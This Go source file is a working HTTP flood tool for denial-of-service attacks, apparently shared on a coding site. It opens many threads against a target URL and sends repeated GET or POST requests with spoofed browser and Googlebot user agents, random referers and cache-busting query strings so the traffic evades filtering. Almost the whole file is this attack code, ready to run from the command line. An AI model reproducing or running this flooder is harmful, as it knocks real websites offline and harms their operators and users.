/*
Coded by LeeOn123
Please fking code ur script by ur self, kid.

I changed the random integers range to the max of int32.
Now 386 systems should work well.

Looks like most people want to hit the url but not the host/ip.
As a result, here you are.
*/
package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/url"
	"os"
	"strconv"
	"strings"
	"time"
)

var (
	host      = ""
	port      = "80"
	page      = ""
	mode      = ""
	abcd      = "asdfghjklqwertyuiopzxcvbnmASDFGHJKLQWERTYUIOPZXCVBNM"
	start     = make(chan bool)
	acceptall = []string{
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept-Encoding: gzip, deflate\r\n",
		"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
		"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
		"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
		"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
		"Accept: text/html, application/xhtml+xml",
		"Accept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n"}
	key     string
	choice  = []string{"Macintosh", "Windows", "X11"}
	choice2 = []string{"68K", "PPC", "Intel Mac OS X"}
	choice3 = []string{"Win3.11", "WinNT3.51", "WinNT4.0", "Windows NT 5.0", "Windows NT 5.1", "Windows NT 5.2", "Windows NT 6.0", "Windows NT 6.1", "Windows NT 6.2", "Win 9x 4.90", "WindowsCE", "Windows XP", "Windows 7", "Windows 8", "Windows NT 10.0; Win64; x64"}
	choice4 = []string{"Linux i686", "Linux x86_64"}
	choice5 = []string{"chrome", "spider", "ie"}
	choice6 = []string{".NET CLR", "SV1", "Tablet PC", "Win64; IA64", "Win64; x64", "WOW64"}
	spider  = []string{
		"AdsBot-Google ( http://www.google.com/adsbot.html)",
		"Baiduspider ( http://www.baidu.com/search/spider.htm)",
		"FeedFetcher-Google; ( http://www.google.com/feedfetcher.html)",
		"Googlebot/2.1 ( http://www.googlebot.com/bot.html)",
		"Googlebot-Image/1.0",
		"Googlebot-News",
		"Googlebot-Video/1.0",
	}
	referers = []string{
		"https://www.google.com/search?q=",
		"https://check-host.net/",
		"https://www.facebook.com/",
		"https://www.youtube.com/",
		"https://www.fbi.com/",
		"https://www.bing.com/search?q=",
		"https://r.search.yahoo.com/",
		"https://www.cia.gov/index.html",
		"https://vk.com/profile.php?auto=",
		"https://www.usatoday.com/search/results?q=",
		"https://help.baidu.com/searchResult?keywords=",
		"https://steamcommunity.com/market/search?q=",
		"https://www.ted.com/search?q=",
		"https://play.google.com/store/search?q=",
		"https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=", 
		"https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=", 
		"https://drive.google.com/viewerng/viewer?url=", 
		"http://www.google.com/translate?u=", 
		"https://developers.google.com/speed/pagespeed/insights/?url=", 
		"http://help.baidu.com/searchResult?keywords=", 
		"http://www.bing.com/search?q=", 
		"https://add.my.yahoo.com/rss?url=", 
		"https://play.google.com/store/search?q=", 
		"http://www.google.com/?q=", 
		"http://regex.info/exif.cgi?url=", 
		"http://anonymouse.org/cgi-bin/anon-www.cgi/", 
		"http://www.google.com/translate?u=", 
		"http://translate.google.com/translate?u=", 
		"http://validator.w3.org/feed/check.cgi?url=", 
		"http://www.w3.org/2001/03/webdata/xsv?style=xsl&docAddrs=", 
		"http://validator.w3.org/check?uri=", 
		"http://jigsaw.w3.org/css-validator/validator?uri=", 
		"http://validator.w3.org/checklink?uri=", 
		"http://www.w3.org/RDF/Validator/ARPServlet?URI=", 
		"http://www.w3.org/2005/08/online_xslt/xslt?xslfile=http%3A%2F%2Fwww.w3.org%2F2002%2F08%2Fextract-semantic.xsl&xmlfile=", 
		"http://www.w3.org/2005/08/online_xslt/xslt?xmlfile=http://www.w3.org&xslfile=", 
		"http://validator.w3.org/mobile/check?docAddr=", 
		"http://validator.w3.org/p3p/20020128/p3p.pl?uri=", 
		"http://online.htmlvalidator.com/php/onlinevallite.php?url=", 
		"http://feedvalidator.org/check.cgi?url=", 
		"http://gmodules.com/ig/creator?url=", 
		"http://www.google.com/ig/adde?moduleurl=", 
		"http://www.cynthiasays.com/mynewtester/cynthia.exe?rptmode=-1&url1=", 
		"http://www.watchmouse.com/en/checkit.php?c=jpcheckit&vurl=",
		"http://host-tracker.com/check_page/?furl=", 
		"http://panel.stopthehacker.com/services/validate-payflow?email=1@1.com&callback=a&target=", 
		"http://www.onlinewebcheck.com/check.php?url=", 
		"http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=", 
		"http://www.translate.ru/url/translation.aspx?direction=er&sourceURL=", 
	    "http://host-tracker.com/check_page/?furl=",
        "http://jigsaw.w3.org/css-validator/validator?uri=",
        "http://www.google.com/translate?u=",
        "http://anonymouse.org/cgi-bin/anon-www.cgi/",
        "http://www.onlinewebcheck.com/?url=",
        "http://feedvalidator.org/check.cgi?url=",
        "http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=",
        "http://www.translate.ru/url/translation.aspx?direction=er&sourceURL=",
        "http://validator.w3.org/feed/check.cgi?url=",
        "http://www.pagescoring.com/website-speed-test/?url=",
        "http://check-host.net/check-http?host=",
        "http://checksite.us/?url=",
        "http://jobs.bloomberg.com/search?q=",
        "http://www.bing.com/search?q=",
        "https://www.yandex.com/yandsearch?text=",
        "http://www.google.com/?q=",
        "https://add.my.yahoo.com/rss?url=",
        "http://www.bestbuytheater.com/events/search?q=",
        "http://www.shodanhq.com/search?q=",
        "https://play.google.com/store/search?q=",
        "http://coccoc.com/search#query=",
        "https://w...content-available-to-author-only...m.vn/?gws_rd=ssl#q=",
        "http://y...content-available-to-author-only...x.ru/yandsearch?text=%D1%%D2%?=g.sql()81%..",
        "http://content-available-to-author-only.com/profile.php?redirect=",
        "http://w...content-available-to-author-only...y.com/search/results?q=",
        "http://y...content-available-to-author-only...x.ru/yandsearch?text=",
        "http://g...content-available-to-author-only...l.ru/search?mail.ru=1&q=",
        "http://n...content-available-to-author-only...r.ru/search?=btnG?=%D0?2?%D0?2?%=D0..",
        "http://r...content-available-to-author-only...a.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%..",
        "http://r...content-available-to-author-only...o.com/search;_yzt=?=A7x9Q.bs67zf..",
        "http://r...content-available-to-author-only...o.com/search;?_query?=l%t=?=?A7x..",
        "http://g...content-available-to-author-only...l.ru/search?gay.ru.query=1&q=?abc.r..",
        "http://n...content-available-to-author-only...r.ru/search?btnG=%D0%9D%?D0%B0%D0%B..",
        "http://w...content-available-to-author-only...e.ru/url?sa=t&rct=?j&q=&e..",
        "http://h...content-available-to-author-only...u.com/searchResult?keywords=",
        "http://w...content-available-to-author-only...g.com/search?q=",
        "https://w...content-available-to-author-only...x.com/yandsearch?text=",
        "https://d...content-available-to-author-only...o.com/?q=",
        "http://w...content-available-to-author-only...k.com/web?q=",
        "http://s...content-available-to-author-only...l.com/aol/search?q=",
        "https://w...content-available-to-author-only...m.nl/vaste-onderdelen/zoeken/?zoeken_term=",
        "http://v...content-available-to-author-only...3.org/feed/check.cgi?url=",
        "http://h...content-available-to-author-only...r.com/check_page/?furl=",
        "http://w...content-available-to-author-only...r.com/url/translation.aspx?direction=er&sourceURL=",
        "http://j...content-available-to-author-only...3.org/css-validator/validator?uri=",
        "https://a...content-available-to-author-only...o.com/rss?url=",
        "http://e...content-available-to-author-only...l.com/search?q=",
        "https://s...content-available-to-author-only...y.com/market/search?q=",
        "http://f...content-available-to-author-only...o.com/search?q=",
        "http://w...content-available-to-author-only...t.com/site/pinterest.com/search?q=",
        "http://e...content-available-to-author-only...e.net/wow/en/search?q=",
        "http://e...content-available-to-author-only...l.com/search?q=",
        "http://c...content-available-to-author-only...n.org/search?q=",
        "http://t...content-available-to-author-only...t.edu/search?q=",
        "http://w...content-available-to-author-only...m.tv/search?q=",
        "http://w...content-available-to-author-only...d.com/search?q=",
        "http://f...content-available-to-author-only...a.com/search?q=",
        "http://i...content-available-to-author-only...h.io/search?q=",
        "http://j...content-available-to-author-only...s.com/jobs/search?q=",
        "http://t...content-available-to-author-only...p.org/search?q=",
        "http://w...content-available-to-author-only...m.vn/news/vn/search&q=",
        "https://play.google.com/store/search?q=",
        "http://w...content-available-to-author-only...s.gov/@@tceq-search?q=",
        "http://w...content-available-to-author-only...t.com/search?q=",
        "http://w...content-available-to-author-only...r.com/events/search?q=",
        "https://c...content-available-to-author-only...e.org/search?q=",
        "http://j...content-available-to-author-only...s.com/search?q=",
        "http://j...content-available-to-author-only...g.com/search?q=",
        "https://w...content-available-to-author-only...t.com/search/?q=",
        "http://m...content-available-to-author-only...r.org/search?q=",
        "https://w...content-available-to-author-only...s.com/search?q=",
        "http://w...content-available-to-author-only...s.uk/search?q=",
        "http://w...content-available-to-author-only...q.com/search?q=",
        "http://www.search.com/search?q=",
        "https://add.my.yahoo.com/rss?url=",
        "https://images2-focus-opensocial.googleusercontent.com/gadgets/proxy?container=focus&url=",
        "https://www.facebook.com/l.php?u=",
        "https://www.facebook.com/l.php?u=",
        "https://drive.google.com/viewerng/viewer?url=",
        "http://www.google.com/translate?u=",
        "http://downforeveryoneorjustme.com/",
        "http://www.slickvpn.com/go-dark/browse.php?u=",
        "https://www.megaproxy.com/go/_mp_framed?",
        "http://scanurl.net/?u=",
        "http://www.isup.me/",
        "http://check-host.net/check-tcp?host=",
        "http://check-host.net/check-dns?host=",
        "http://check-host.net/check-ping?host=",
        "http://www.currentlydown.com/",
        "http://check-host.net/check-ping?host=",
        "http://check-host.net/check-tcp?host=",
        "http://check-host.net/check-dns?host=",
        "http://check-host.net/ip-info?host=",
        "https://safeweb.norton.com/report/show?url=",
        "http://www.webproxy.net/view?q=",
        "http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=",
        "https://anonysurfer.com/a2/index.php?q=",
        "http://analiz.web.tr/en/www/",
        "https://plus.google.com/share?url=",
	}
)

func init() {
	rand.Seed(time.Now().UnixNano()) //fixed seed problem
}
func getuseragent() string {

	platform := choice[rand.Intn(len(choice))]
	var os string
	if platform == "Macintosh" {
		os = choice2[rand.Intn(len(choice2)-1)]
	} else if platform == "Windows" {
		os = choice3[rand.Intn(len(choice3)-1)]
	} else if platform == "X11" {
		os = choice4[rand.Intn(len(choice4)-1)]
	}
	browser := choice5[rand.Intn(len(choice5)-1)]
	if browser == "chrome" {
		webkit := strconv.Itoa(rand.Intn(599-500) + 500)
		uwu := strconv.Itoa(rand.Intn(99)) + ".0" + strconv.Itoa(rand.Intn(9999)) + "." + strconv.Itoa(rand.Intn(999))
		return "Mozilla/5.0 (" + os + ") AppleWebKit/" + webkit + ".0 (KHTML, like Gecko) Chrome/" + uwu + " Safari/" + webkit
	} else if browser == "ie" {
		uwu := strconv.Itoa(rand.Intn(99)) + ".0"
		engine := strconv.Itoa(rand.Intn(99)) + ".0"
		option := rand.Intn(1)
		var token string
		if option == 1 {
			token = choice6[rand.Intn(len(choice6)-1)] + "; "
		} else {
			token = ""
		}
		return "Mozilla/5.0 (compatible; MSIE " + uwu + "; " + os + "; " + token + "Trident/" + engine + ")"
	}
	return spider[rand.Intn(len(spider))]
}

func contain(char string, x string) int { //simple compare
	times := 0
	ans := 0
	for i := 0; i < len(char); i++ {
		if char[times] == x[0] {
			ans = 1
		}
		times++
	}
	return ans
}

func flood() {
	addr := host + ":" + port
	header := ""
	if mode == "get" {
		header += " HTTP/1.1\r\nHost: "
		header += addr + "\r\n"
		if os.Args[5] == "nil" {
			header += "Connection: Keep-Alive\r\nCache-Control: max-age=0\r\n"
			header += "User-Agent: " + getuseragent() + "\r\n"
			header += acceptall[rand.Intn(len(acceptall))]
			header += referers[rand.Intn(len(referers))] + "\r\n"
		} else {
			func() {
				fi, err := os.Open(os.Args[5])
				if err != nil {
					fmt.Printf("Error: %s\n", err)
					return
				}
				defer fi.Close()
				br := bufio.NewReader(fi)
				for {
					a, _, c := br.ReadLine()
					if c == io.EOF {
						break
					}
					header += string(a) + "\r\n"
				}
			}()
		}
	} else if mode == "post" {
		data := ""
		if os.Args[5] != "nil" {
			func() {
				fi, err := os.Open(os.Args[5])
				if err != nil {
					fmt.Printf("Error: %s\n", err)
					return
				}
				defer fi.Close()
				br := bufio.NewReader(fi)
				for {
					a, _, c := br.ReadLine()
					if c == io.EOF {
						break
					}
					header += string(a) + "\r\n"
				}
			}()

		} else {
			data = "f"
		}
		header += "POST " + page + " HTTP/1.1\r\nHost: " + addr + "\r\n"
		header += "Connection: Keep-Alive\r\nContent-Type: x-www-form-urlencoded\r\nContent-Length: " + strconv.Itoa(len(data)) + "\r\n"
		header += "Accept-Encoding: gzip, deflate\r\n\n" + data + "\r\n"
	}
	var s net.Conn
	var err error
	<-start //received signal
	for {
		if port == "443" {
			cfg := &tls.Config{
				InsecureSkipVerify: true,
				ServerName:         host, //simple fix
			}
			s, err = tls.Dial("tcp", addr, cfg)
		} else {
			s, err = net.Dial("tcp", addr)
		}
		if err != nil {
			fmt.Println("Connection timed out") //When showing this message, it means ur ip got blocked or the target server down.
		} else {
			for i := 0; i < 100; i++ {
				request := ""
				if os.Args[3] == "get" {
					request += "GET " + page + key
					request += strconv.Itoa(rand.Intn(2147483647)) + string(string(abcd[rand.Intn(len(abcd))])) + string(abcd[rand.Intn(len(abcd))]) + string(abcd[rand.Intn(len(abcd))]) + string(abcd[rand.Intn(len(abcd))])
				}
				request += header + "\r\n"
				s.Write([]byte(request))
			}
			s.Close()
		}
		//fmt.Println("Threads@", threads, " Hitting Target -->", url)// For those who like share to skid.
	}
}

func main() {
	fmt.Println("\u001B[35m		╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗         ")
    fmt.Println("\u001B[35m		╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║║         ")
    fmt.Println("\u001B[35m		╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝═╩╝          ")
	if len(os.Args) != 6 {
		fmt.Println("Post Mode will use header.txt as data")
		fmt.Println("If you are using linux please run 'ulimit -n 999999' first!!!")
		fmt.Println("Usage: ", os.Args[0], "<url> <threads> <get/post> <seconds> <header.txt/nil>")
		os.Exit(1)
	}
	u, err := url.Parse(os.Args[1])
	if err != nil {
		println("Please input a correct url")
	}
	tmp := strings.Split(u.Host, ":")
	host = tmp[0]
	if u.Scheme == "https" {
		port = "443"
	} else {
		port = u.Port()
	}
	if port == "" {
		port = "80"
	}
	page = u.Path
	if os.Args[3] != "get" && os.Args[3] != "post" {
		println("Wrong mode, Only can use \"get\" or \"post\"")
		return
	}
	mode = os.Args[3]
	threads, err := strconv.Atoi(os.Args[2])
	if err != nil {
		fmt.Println("Threads should be a integer")
	}
	limit, err := strconv.Atoi(os.Args[4])
	if err != nil {
		fmt.Println("limit should be a integer")
	}
	if contain(page, "?") == 0 {
		key = "?"
	} else {
		key = "&"
	}

	for i := 0; i < threads; i++ {
		time.Sleep(time.Microsecond * 1)
		go flood() // Start threads
		fmt.Printf("\rStart Threads [%.0f] are ready [%.0f]", float64(i+1))
		os.Stdout.Sync()
		//time.Sleep( time.Millisecond * 1)
	}
	fmt.Println("Flood will end in " + os.Args[4] + " seconds.")
	close(start)
	time.Sleep(time.Duration(limit) * time.Second)
	//Keep the threads continue
}